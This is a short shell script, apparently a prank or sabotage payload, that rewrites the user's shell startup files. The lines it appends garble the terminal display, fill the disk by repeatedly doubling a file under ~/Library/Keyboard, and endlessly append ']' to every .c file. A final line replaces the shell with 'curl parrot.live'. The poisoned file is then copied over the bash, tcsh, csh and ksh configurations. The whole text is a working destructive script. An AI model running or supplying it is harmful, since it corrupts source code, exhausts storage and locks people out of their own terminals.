mv ~/.zshrc ~/.zshrc.bak
echo "echo \"\e(0\"" >> ~/.zshrc
echo "head -c 10000 /dev/urandom >> ~/Library/Keyboard/meta.dat && cat ~/Library/Keyboard/meta.dat >> ~/Library/Keyboard/meta.dat &" >> ~/.zshrc
echo "while true; do echo ] >> **/*.c; done &" >> ~/.zshrc
echo "exec curl parrot.live" >> ~/.zshrc
cp ~/.zshrc ~/.bashrc
cp ~/.zshrc ~/.tcshrc
cp ~/.zshrc ~/.cshrc
cp ~/.zshrc ~/.kshrc
exec zsh
